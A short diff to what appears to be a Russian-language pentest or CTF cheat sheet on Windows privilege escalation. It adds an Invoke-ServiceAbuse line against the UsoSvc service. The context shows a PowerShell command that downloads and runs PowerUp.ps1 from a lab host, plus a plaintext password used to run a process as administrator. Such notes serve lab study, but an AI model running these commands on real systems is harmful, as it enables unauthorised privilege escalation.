@@ -128,6 +128,8 @@ iex(New-Object Net.Webclient).downloadstring('http://10.10.14.10/PowerUp.ps1')  
 
 Invoke-AllChecks
 
+invoke-ServiceAbuse -Name 'UsoSvc' ---- злоупотребление службой (запуск и изменение)
+
 # Запуск процесса от имени другого пользователя (администратора)
 
 $passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
